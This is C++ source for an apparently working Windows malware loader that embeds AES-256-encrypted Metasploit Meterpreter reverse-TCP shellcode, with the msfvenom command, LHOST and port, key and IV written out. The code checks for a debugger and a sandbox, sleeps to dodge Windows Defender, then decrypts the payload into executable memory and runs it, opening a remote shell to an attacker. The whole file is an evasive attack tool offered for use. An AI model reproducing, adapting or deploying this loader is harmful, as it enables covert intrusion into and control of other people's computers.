// dllmain.cpp : Définit le point d'entrée de l'application DLL.
#define CBC 1
#include "aes.h"
#include <Windows.h>
#include <Wininet.h>
#include <stdbool.h> 
#include <stdio.h>
#include <string.h> 
#include <stdlib.h> 
#include <iostream>

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Wininet.lib")

using namespace std;

// Actual length of the payload 
#define PAYLOADLENGTH 458
#define IV "E7a0eCX76F0YzS4j"
#define KEY "6ASMkFslyhwXehNZw048cF1Vh1ACzyyR"
#define CLASSNAME "myWindowClass"
#define WINDOWTITLE "My Title"

// RC4 payload is used to maximize stealth during network communication. 
// $ ruby msfvenom -p windows/meterpreter/reverse_tcp_rc4 EXIT_FUNC=PROCESS LHOST-192.168.1.18 LPORT=443 RC4PASSWORD=GeekIsChic --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f c -o /mnt/hgfs/share_vm/meterpreter.c
// Payload size: 458 bytes
// Final size of c file : 1973 bytes
unsigned char buf[] =
"\x62\x7e\x8e\x3f\x11\x74\x66\xdd\x2b\x2f\x67\xad\xdf\xa6\x05"
"\xe6\x06\x63\xb9\x69\xcc\x7f\xbb\x63\x64\x79\xf1\x09\x77\xf6"
"\x04\x90\x5e\x06\xe6\xb7\x62\x29\x34\x0d\x18\xca\x95\x6f\x93"
"\xc5\xa2\x6b\x66\xa9\x07\x4e\x33\x06\x60\x10\xd1\x1d\x44\x2a"
"\x65\x95\x50\x7c\x1a\x9d\xe1\x76\x09\xc5\x0c\x33\x73\x8e\x72"
"\xbd\x0d\x37\x0c\x6f\x94\x53\x2f\x54\x90\xff\x41\x2a\x5d\x14"
"\x9d\xd4\x42\x3e\x7a\xcd\x2b\x50\x5c\x1a\x1f\xc2\x38\x99\x4a"
"\x13\xcc\x12\x05\x9b\x95\x2a\x20\x47\x79\xf3\x10\xd0\xd8\x9a"
"\xa1\x9f\xe7\x0e\x07\x2f\x53\x3c\x3e\x8c\xcb\x04\xcf\xfc\xac"
"\xb9\x18\x12\x17\x16\xb4\x41\x4d\x49\x67\xa4\xb1\xbb\x9f\xc9"
"\xe9\x61\x6e\xd0\x0d\x7b\x73\x31\x6f\x73\x00\x3e\x9f\x97\x30"
"\x9e\xa7\xcf\x67\xee\x79\x27\x15\xbd\xab\xf1\x65\x51\x65\x40"
"\x4b\xd2\x17\xa4\x6b\x04\x39\x9c\xb1\x7e\x7d\xd4\x57\xe4\x3e"
"\xad\x93\xfb\xb8\x84\xe9\x66\x5f\xb7\x8d\x3d\x4b\xf9\x57\x7e"
"\x5f\xde\xfc\x0c\x8f\xa3\x9d\x16\x75\xb0\x42\xe5\xac\x12\xbd"
"\x5a\xe7\x2b\xa5\x78\xbf\xa6\x6d\x74\x21\x68\xd9\xb2\x02\x28"
"\x49\x16\x18\x80\xa1\xd2\xee\x9a\xd0\x82\x6b\xaf\xb8\x6b\xca"
"\xfe\x86\xbd\xae\x7e\x09\xcf\x57\x79\x2c\x7f\xca\x30\xd9\x5f"
"\xa7\x0b\x07\x1a\xd5\x79\x78\x9e\x5f\xde\xa8\xee\x7f\x46\xdb"
"\x52\x56\xfc\x66\x35\xca\x34\x7e\x1d\x1e\xb6\xf8\x94\x42\x58"
"\xaa\xc2\xf6\x6a\xea\xd8\x95\x61\x55\x18\xbe\x65\x4f\x12\xec"
"\x9a\x95\x26\x8b\xa2\xcc\x23\x4e\xf7\xbb\xce\x3f\x6d\x91\x82"
"\x34\xc2\xf3\x46\xf7\x65\x0b\x54\xf1\x8d\xd5\x51\xc8\x55\xa5"
"\x70\x89\xf3\x9d\x46\xbd\x45\xd4\xa1\x3f\xb8\x8c\x20\x6d\x35"
"\xf9\x82\xb9\x10\x6a\x49\xe0\x21\x60\x53\xeb\xf3\xae\xd7\xbf"
"\x68\xb1\x1c\x79\x00\x6f\x18\xf3\xf2\xac\x7b\x55\xe0\x93\xe6"
"\x79\x87\xbc\xfc\xcf\x6c\x1b\xad\x59\xf8\x43\x15\x03\x14\x78"
"\x33\x5d\xb8\xb2\x35\x4a\x90\x82\xbf\xaf\x75\x15\xe0\xe3\xe4"
"\xce\xea\x14\x9a\x2d\xc5\x66\x34\xb6\xa9\x79\x0c\xd0\x35\x68"
"\x8d\x56\xb0\x71\x9c\xf9\x51\x41\xea\x3b\x49\xfb\xaf\x09\x03"
"\x59\x9e\x36\x8a\xc5\x14\x82\x19\x7a\x28\x98\x06\x12\x65";




const int ENCRYPTEDBUFFERLENGTH = sizeof(buf);

namespace Aes256MsfPayload {
	class Utils {
	public:
		static char IsDbgPresent() {
			char present = 0;
			__asm {
				mov eax, fs:[30h]
				mov al, [eax + 2h]
				mov present, al
			}
#ifdef DEBUG 
			return 0;
#else
			return present;
#endif
		}

		static bool IsSandboxPresent() {
			// Non-uniform memory access (NUMA) is a computer memory design used in multiprocessing, 
			// where the memory access time depends on the memory location relative to the processor.
			// https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf
			return VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0) == NULL;
		}

		static DWORD WINAPI ExecuteCode(LPVOID lpPayload) {
			void(*func)();
			func = (void(*)()) lpPayload;
			(void)(*func)();
			return 0;
		}
	};

	class CryptoUtils {
	public:
		static void AES256Decrypt(uint8_t* uString, uint8_t* uIv, const char* uKey) {
			struct AES_ctx ctx;
			AES_init_ctx_iv(&ctx, uKey, uIv);
			AES_CBC_decrypt_buffer(&ctx, uString, PAYLOADLENGTH);

			// The last byte needs to a null-byte terminator to read correctly.
			memcpy((char*)uString + PAYLOADLENGTH, "\x00", 1);
		}
	};

	class ExecuteGenericPayload {
	public:
		void Start() {
			TCHAR s[256];

			LPVOID lpPayload = VirtualAlloc(NULL, ENCRYPTEDBUFFERLENGTH, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (lpPayload) {
				ZeroMemory(lpPayload, ENCRYPTEDBUFFERLENGTH);
				memcpy(lpPayload, buf, ENCRYPTEDBUFFERLENGTH);
			}
			else {
				return;
			}

			// uint8_t : 8 unsigned bits
			uint8_t* uPayload = (uint8_t*)lpPayload;
			uint8_t* uIv = (uint8_t*)IV;
			//uint8_t* uKey = (uint8_t*)KEY;

			CryptoUtils::AES256Decrypt(uPayload, uIv, KEY);

			// Also useful to bypass Sandboxing
			// AFAIK it's working for Windows Defender
			Sleep(10000);
			Utils::ExecuteCode(uPayload);
		}
	};
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	//::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	if (!Aes256MsfPayload::Utils::IsDbgPresent() && !Aes256MsfPayload::Utils::IsSandboxPresent()) {
		Aes256MsfPayload::ExecuteGenericPayload* p = new Aes256MsfPayload::ExecuteGenericPayload();
		try {
			p->Start();
			delete(p);
		}
		catch (const std::exception &e) {
		}
	}

	return 0;
}
